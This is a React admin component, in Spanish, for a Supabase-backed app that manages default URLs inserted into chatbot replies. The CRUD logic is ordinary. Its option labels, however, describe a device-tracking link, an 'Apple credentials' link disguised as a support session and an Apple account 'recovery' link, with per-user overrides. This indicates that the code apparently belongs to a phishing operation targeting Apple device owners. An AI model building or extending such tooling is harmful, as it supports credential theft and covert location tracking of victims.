import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from '@/components/ui/table';
import { 
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from '@/components/ui/dialog';
import { toast } from 'sonner';
import { supabase } from '@/integrations/supabase/client';
import { Plus, Edit2, Trash2, Globe, Loader2, Info } from 'lucide-react';

interface GlobalUrl {
  id: string;
  setting_key: string;
  setting_value: string | null;
  created_at: string;
}

const AVAILABLE_URL_KEYS = [
  { key: 'url_option_2', label: 'URL Opción 2', description: 'Ubicación mediante navegador web (rastreo del dispositivo)' },
  { key: 'url_option_3', label: 'URL Opción 3', description: 'Sesión técnica con soporte (enlace de credenciales Apple)' },
  { key: 'url_option_4', label: 'URL Opción 4', description: 'Restaurar acceso a cuenta Apple (enlace de recuperación)' },
];

const GlobalChatbotUrls = () => {
  const [urls, setUrls] = useState<GlobalUrl[]>([]);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [dialogOpen, setDialogOpen] = useState(false);
  const [editingUrl, setEditingUrl] = useState<GlobalUrl | null>(null);
  const [formData, setFormData] = useState({ url_key: '', url_value: '' });

  useEffect(() => {
    loadUrls();
  }, []);

  const loadUrls = async () => {
    try {
      const { data, error } = await supabase
        .from('system_settings')
        .select('*')
        .like('setting_key', 'global_url_option_%')
        .order('setting_key');

      if (error) throw error;
      setUrls(data || []);
    } catch (error) {
      console.error('Error loading global URLs:', error);
      toast.error('Error al cargar las URLs globales');
    } finally {
      setLoading(false);
    }
  };

  const handleSave = async () => {
    if (!formData.url_key || !formData.url_value) {
      toast.error('Completa todos los campos');
      return;
    }

    // Basic URL validation
    try {
      new URL(formData.url_value);
    } catch {
      toast.error('Ingresa una URL válida (debe comenzar con http:// o https://)');
      return;
    }

    setSaving(true);
    try {
      const settingKey = `global_${formData.url_key}`;

      if (editingUrl) {
        // Update existing
        const { error } = await supabase
          .from('system_settings')
          .update({ setting_value: formData.url_value })
          .eq('id', editingUrl.id);

        if (error) throw error;
        toast.success('URL global actualizada correctamente');
      } else {
        // Check if key already exists
        const existing = urls.find(u => u.setting_key === settingKey);
        if (existing) {
          toast.error('Ya existe una URL global para esta opción');
          setSaving(false);
          return;
        }

        // Insert new
        const { error } = await supabase
          .from('system_settings')
          .insert({
            setting_key: settingKey,
            setting_value: formData.url_value
          });

        if (error) throw error;
        toast.success('URL global agregada correctamente');
      }

      setDialogOpen(false);
      setEditingUrl(null);
      setFormData({ url_key: '', url_value: '' });
      loadUrls();
    } catch (error: any) {
      console.error('Error saving global URL:', error);
      toast.error(error.message || 'Error al guardar la URL');
    } finally {
      setSaving(false);
    }
  };

  const handleDelete = async (id: string) => {
    if (!confirm('¿Estás seguro de eliminar esta URL global?')) return;

    try {
      const { error } = await supabase
        .from('system_settings')
        .delete()
        .eq('id', id);

      if (error) throw error;
      toast.success('URL global eliminada');
      loadUrls();
    } catch (error) {
      console.error('Error deleting global URL:', error);
      toast.error('Error al eliminar la URL');
    }
  };

  const openAddDialog = () => {
    setEditingUrl(null);
    setFormData({ url_key: '', url_value: '' });
    setDialogOpen(true);
  };

  const openEditDialog = (url: GlobalUrl) => {
    setEditingUrl(url);
    // Convert 'global_url_option_2' back to 'url_option_2'
    const urlKey = url.setting_key.replace('global_', '');
    setFormData({ url_key: urlKey, url_value: url.setting_value || '' });
    setDialogOpen(true);
  };

  const getAvailableKeys = () => {
    const usedKeys = urls.map(u => u.setting_key.replace('global_', ''));
    return AVAILABLE_URL_KEYS.filter(k => !usedKeys.includes(k.key));
  };

  const getKeyLabel = (settingKey: string) => {
    const urlKey = settingKey.replace('global_', '');
    return AVAILABLE_URL_KEYS.find(k => k.key === urlKey)?.label || settingKey;
  };

  const getPlaceholder = (settingKey: string) => {
    const urlKey = settingKey.replace('global_', '');
    return `{{${urlKey}}}`;
  };

  if (loading) {
    return (
      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
        <CardContent className="flex items-center justify-center py-12">
          <Loader2 className="h-8 w-8 animate-spin text-blue-400" />
        </CardContent>
      </Card>
    );
  }

  return (
    <div className="space-y-6">
      {/* Info Card */}
      <Card className="bg-green-900/20 backdrop-blur-xl border border-green-500/30">
        <CardHeader className="pb-2">
          <CardTitle className="text-green-300 flex items-center gap-2 text-lg">
            <Info className="h-5 w-5" />
            ¿Cómo funcionan las URLs Globales?
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="text-green-200/70 text-sm space-y-2">
            <p>
              Las URLs globales se usan como <strong>valores por defecto</strong> para los placeholders 
              como <code className="bg-green-800/40 px-1 rounded">{'{{url_option_2}}'}</code> en las respuestas del chatbot.
            </p>
            <p>
              Si un usuario tiene configurada su propia URL personalizada, se usará esa en lugar de la global.
            </p>
            <p className="text-green-300/80 font-medium">
              Estas URLs aplican a todos los usuarios que no tengan sus propias URLs configuradas.
            </p>
          </div>
        </CardContent>
      </Card>

      {/* URLs Table */}
      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
        <CardHeader className="flex flex-row items-center justify-between">
          <CardTitle className="text-blue-300 flex items-center gap-2">
            <Globe className="h-5 w-5" />
            URLs Globales del Chatbot
          </CardTitle>
          <Button 
            onClick={openAddDialog}
            className="bg-blue-600 hover:bg-blue-700"
            disabled={getAvailableKeys().length === 0}
          >
            <Plus className="h-4 w-4 mr-2" />
            Agregar URL
          </Button>
        </CardHeader>
        <CardContent>
          {urls.length === 0 ? (
            <div className="text-center py-8 text-blue-200/60">
              <Globe className="h-12 w-12 mx-auto mb-4 opacity-50" />
              <p>No hay URLs globales configuradas</p>
              <p className="text-sm mt-2">Los placeholders en las respuestas no serán reemplazados</p>
            </div>
          ) : (
            <Table>
              <TableHeader>
                <TableRow className="border-blue-500/20">
                  <TableHead className="text-blue-300">Placeholder</TableHead>
                  <TableHead className="text-blue-300">URL Global</TableHead>
                  <TableHead className="text-blue-300 text-right">Acciones</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {urls.map((url) => (
                  <TableRow key={url.id} className="border-blue-500/20">
                    <TableCell className="text-blue-200 font-mono">
                      {getPlaceholder(url.setting_key)}
                    </TableCell>
                    <TableCell className="text-blue-200/80 max-w-xs truncate">
                      <a 
                        href={url.setting_value || '#'} 
                        target="_blank" 
                        rel="noopener noreferrer"
                        className="hover:text-blue-300 hover:underline"
                      >
                        {url.setting_value || 'No configurada'}
                      </a>
                    </TableCell>
                    <TableCell className="text-right">
                      <div className="flex items-center justify-end gap-2">
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={() => openEditDialog(url)}
                          className="text-blue-300 hover:text-blue-200 hover:bg-blue-800/30"
                        >
                          <Edit2 className="h-4 w-4" />
                        </Button>
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={() => handleDelete(url.id)}
                          className="text-red-400 hover:text-red-300 hover:bg-red-800/30"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>

      {/* Add/Edit Dialog */}
      <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
        <DialogContent className="bg-slate-900 border-blue-500/30">
          <DialogHeader>
            <DialogTitle className="text-blue-300">
              {editingUrl ? 'Editar URL Global' : 'Agregar URL Global'}
            </DialogTitle>
          </DialogHeader>

          <div className="space-y-4 py-4">
            {!editingUrl && (
              <div className="space-y-2">
                <Label className="text-blue-200">Seleccionar Placeholder</Label>
                <select
                  value={formData.url_key}
                  onChange={(e) => setFormData({ ...formData, url_key: e.target.value })}
                  className="w-full bg-slate-800 border border-blue-500/30 rounded-md px-3 py-2 text-blue-100 focus:outline-none focus:ring-2 focus:ring-blue-500"
                >
                  <option value="">Seleccionar...</option>
                  {getAvailableKeys().map((option) => (
                    <option key={option.key} value={option.key}>
                      {option.label} - {option.description}
                    </option>
                  ))}
                </select>
              </div>
            )}

            {editingUrl && (
              <div className="space-y-2">
                <Label className="text-blue-200">Placeholder</Label>
                <Input
                  value={getKeyLabel(editingUrl.setting_key)}
                  disabled
                  className="bg-slate-800/50 border-blue-500/30 text-blue-200"
                />
              </div>
            )}

            <div className="space-y-2">
              <Label className="text-blue-200">URL Global</Label>
              <Input
                value={formData.url_value}
                onChange={(e) => setFormData({ ...formData, url_value: e.target.value })}
                placeholder="https://tudominio.com/pagina"
                className="bg-slate-800 border-blue-500/30 text-blue-100"
              />
              <p className="text-xs text-blue-200/60">
                Esta URL se usará para todos los usuarios que no tengan configurada su propia URL
              </p>
            </div>
          </div>

          <DialogFooter>
            <Button
              variant="ghost"
              onClick={() => setDialogOpen(false)}
              className="text-blue-300"
            >
              Cancelar
            </Button>
            <Button
              onClick={handleSave}
              disabled={saving}
              className="bg-blue-600 hover:bg-blue-700"
            >
              {saving ? (
                <>
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                  Guardando...
                </>
              ) : (
                'Guardar'
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default GlobalChatbotUrls;
